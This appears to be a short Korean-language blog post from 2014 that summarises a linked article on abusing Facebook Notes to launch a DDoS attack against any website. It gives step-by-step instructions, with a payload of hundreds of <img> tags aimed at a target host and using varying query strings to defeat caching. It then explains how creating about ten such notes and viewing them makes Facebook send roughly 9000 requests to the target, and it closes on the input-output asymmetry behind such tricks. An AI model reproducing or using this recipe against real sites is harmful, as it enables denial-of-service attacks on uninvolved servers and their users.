---
layout: post
title: "Using Facebook Notes to DDoS any website"
date: 2014-04-28 08:43:15 +0900
comments: true
categories: 
---

[Using Facebook Notes to DDoS any website](http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website/)

요약해본다.

Step 1. Facebook Notes 는 `<img>` 태그를 받아준다. 원 소스에서 가져다가 캐쉬하는데, 파라메터를 쓰면 caching 을 바이패스할 수 있다.

    <img src=http://targethost/file?=1></img>
    <img src=http://targethost/file?=2></img>
    <img src=http://targethost/file?=3></img>
    <img src=http://targethost/file?=4></img>
    ...
    <img src=http://targethost/file?=1000></img>

Step 2. 이제 m.facebook.com 을 사용해 `note` 를 만든다. 900 언저리에서 사이즈 제한으로 짤릴 것이다.

Step 3. 동일한 내용으로 `note` 를 십여개 만든다. 이제 글 하나당 약 900 ~ 1000 개의 http request 공격이 된다.

Step 4. 이 `note` 들을 한꺼번에 본다. 타겟 서버는 9000 (900 x 10) 개의 http request 을 받게 된다.

많은 DDoS trick 의 요체는 input size v.s. output size 의 비대칭이다. 
내가 가진 제한된 upstream bandwidth 에 비해 대단히 비대칭적인 size 의 output packet 을 만들어낼 수 있냐가 핵심이다.
